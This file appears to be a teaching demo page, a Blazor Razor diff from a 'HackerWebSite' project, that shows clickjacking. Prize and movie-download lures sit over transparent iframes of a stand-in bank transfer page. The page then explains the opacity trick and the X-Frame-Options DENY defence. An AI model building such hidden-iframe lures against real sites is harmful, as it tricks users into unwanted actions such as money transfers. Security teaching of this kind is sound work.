@@ -1,0 +1,234 @@
+﻿@page "/frame"
+
+@using HackerWebSite.Data
+@inject FrameService FrameService
+
+<style>
+    #iframe1 { /* iframe from the victim site */
+        width: 400px;
+        height: 100px;
+        position: absolute;
+        top: 100;
+        opacity: 0.9; /* in real opacity:0 */
+        z-index: 1;
+    }
+
+    #iframe2 { /* iframe from the victim site */
+        width: 400px;
+        height: 100px;
+        position: absolute;
+        top: 100;
+        opacity: 0.5; /* in real opacity:0 */
+        z-index: 1;
+    }
+
+    #iframe3 { /* iframe from the victim site */
+        width: 400px;
+        height: 100px;
+        position: absolute;
+        top: 100;
+        opacity: 0; /* in real opacity:0 */
+        z-index: 1;
+    }
+
+    #iframe4 { /* iframe from the victim site */
+        width: 400px;
+        height: 100px;
+        position: absolute;
+        top: 100;
+        opacity: 0.7; /* in real opacity:0 */
+        z-index: 1;
+    }
+
+    #iframe5 { /* iframe from the victim site */
+        width: 400px;
+        height: 100px;
+        position: absolute;
+        top: 100;
+        opacity: 0.3; /* in real opacity:0 */
+        z-index: 1;
+    }
+</style>
+
+<h2>Click Jacking</h2>
+
+<div class="row ">
+    <div class="col">
+        <a>Want to win $1000000. </a>
+        <iframe id="iframe3" src="http://www.banksite.com:84/Account/Transfer" style="width:10%;height:40px">
+        </iframe>
+        <div>
+            <button class="btn btn-xs btn-primary">Click here!</button>
+        </div>
+    </div>
+
+    <div class="col">
+        <a>Download Avengers - End Game movie from Server 1</a>
+        <iframe id="iframe3" src="http://www.banksite.com:84/Account/Transfer" style="width:10%;height:40px">
+        </iframe>
+        <div>
+            <button class="btn btn-xs btn-primary">Click here!</button>
+        </div>
+    </div>
+    <div class="pull-right">
+        <button class="btn btn-sm btn-outline-secondary" @onclick="ShowOpacityDiv">Show</button>
+    </div>
+</div>
+
+<hr />
+
+<div class="@opacityDiv">
+    <h4>How click jacking is designed</h4>
+
+    <div class="row form-horizontal" id="opacityDiv">
+        <div class="col">
+            <div>Opacity 0.9</div>
+            <iframe id="iframe1" src="http://www.banksite.com:84/Account/Transfer" style="width:50%;height:40px">
+            </iframe>
+            <button class="btn btn-primary">Click here!</button>
+        </div>
+        <div class="col">
+            <div>Opacity 0.7</div>
+            <iframe id="iframe4" src="http://www.banksite.com:84/Account/Transfer" style="width:50%;height:40px">
+            </iframe>
+            <button class="btn btn-primary">Click here!</button>
+        </div>
+        <div class="col">
+            <div>Opacity 0.5</div>
+            <iframe id="iframe2" src="http://www.banksite.com:84/Account/Transfer" style="width:50%;height:40px">
+            </iframe>
+            <button class="btn btn-primary">Click here!</button>
+        </div>
+        <div class="col">
+            <div>Opacity 0.3</div>
+            <iframe id="iframe5" src="http://www.banksite.com:84/Account/Transfer" style="width:50%;height:40px">
+            </iframe>
+            <button class="btn btn-primary">Click here!</button>
+        </div>
+        <div class="col">
+            <div>Opacity 0</div>
+            <iframe id="iframe3" src="http://www.banksite.com:84/Account/Transfer" style="width:50%;height:40px">
+            </iframe>
+            <button class="btn btn-primary">Click here!</button>
+        </div>
+        <div class="pull-right">
+            <button class="btn btn-sm btn-outline-secondary" @onclick="ShowDevelopersDiv">Show</button>
+        </div>
+    </div>
+    
+    <hr />
+</div>
+
+
+<div class="@developersVerificationDiv">
+    <h4>Developer's Verification</h4>
+
+    <div class="row form-horizontal">
+        <div class="col">
+            <div>
+                <h5>Un-Secured Site</h5>
+                <i>Click Jacking is possible. As the site can be loaded in Iframe</i>
+                <iframe src="http://www.banksite.com:84/Account/Transfer" style="width:100%;height:400px">
+                </iframe>
+            </div>
+        </div>
+        <div class="col">
+            <div>
+                <h5>Secured Site</h5>
+                <i>Click Jacking <b>NOT</b> possible. As the site cannot be loaded in Iframe</i>
+                <iframe src="http://www.securedbanksite.com:85/Account/Transfer" style="width:100%;height:400px">
+                </iframe>
+            </div>
+        </div>
+    </div>
+    <br />
+    <div>
+        <p><b>HttpContext.Current.Response.AddHeader("x-frame-options", "DENY");</b></p>
+    </div>
+    <div class="pull-right">
+        <button class="btn btn-sm btn-outline-secondary" @onclick="ShowPopularSitesDiv">Show</button>
+    </div>
+    <hr />
+</div>
+
+<div class="@popularWebSites">
+    <h4>Popular WebSites</h4>
+
+    <div class="row form-horizontal">
+        <div class="col">
+            <h5>Twitter</h5>
+            <iframe src="http://www.twitter.com/" style="width:100%;height:100px">
+            </iframe>
+        </div>
+        <div class="col">
+            <h5>FaceBook</h5>
+            <iframe src="http://www.facebook.com/" style="width:100%;height:100px">
+            </iframe>
+        </div>
+        <div class="col">
+            <h5>LinkedIn</h5>
+            <iframe src="http://www.linkedin.com/" style="width:100%;height:100px">
+            </iframe>
+        </div>
+        <div class="col">
+            <h5>Google</h5>
+            <iframe src="http://www.google.com/" style="width:100%;height:100px">
+            </iframe>
+        </div>
+        <div class="col" style="display:none;">
+            <h5>Google</h5>
+            <iframe src="https://www.g2techsoft.com/" style="width:100%;height:100px">
+            </iframe>
+        </div>
+    </div>
+</div>
+@code {
+    private void ShowOpacityDiv()
+    {
+        if (opacityDiv == "divVisible")
+            opacityDiv = "divHidden";
+        else
+            opacityDiv = "divVisible";
+    }
+
+    private void ShowDevelopersDiv()
+    {
+        if (developersVerificationDiv == "divVisible")
+            developersVerificationDiv = "divHidden";
+        else
+            developersVerificationDiv = "divVisible";
+    }
+
+    private void ShowPopularSitesDiv()
+    {
+        if (popularWebSites == "divVisible")
+            popularWebSites = "divHidden";
+        else
+            popularWebSites = "divVisible";
+    }
+
+    protected override async Task OnInitializedAsync()
+    {
+        opacityDiv = "divHidden";
+        developersVerificationDiv = "divHidden";
+        popularWebSites = "divHidden";
+    }
+}
+
+@functions {
+    string divVilibility { get; set; }
+    string divHidden { get; set; }
+    string opacityDiv { get; set; }
+    string developersVerificationDiv  {  get; set;  }
+    string popularWebSites { get; set; }
+}
+
+<style>
+    .divVisible {
+        display: block;
+    }
+
+    .divHidden {
+        display: none;
+    }
+</style>
